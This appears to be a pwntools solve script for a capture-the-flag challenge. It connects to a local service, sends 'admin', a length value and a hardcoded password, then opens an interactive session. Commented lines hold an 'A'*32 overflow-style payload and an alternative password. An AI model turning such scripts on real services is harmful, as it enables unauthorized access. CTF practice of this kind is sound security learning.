from pwn import *

conn=remote('127.0.0.1',65181)
conn.recv()
#conn.sendline(b"user")
conn.sendline(b"admin")
#conn.sendline(b'32')
conn.sendline(b'26')
payload='A'*32
password1=b"I_am_very_very_strong_password!!"
password2=b"ILovePlayCTFbtwAlsoDota2!"
#conn.sendline(payload)
#conn.sendline(password1)
conn.sendline(password2)
conn.recv()
conn.interactive()
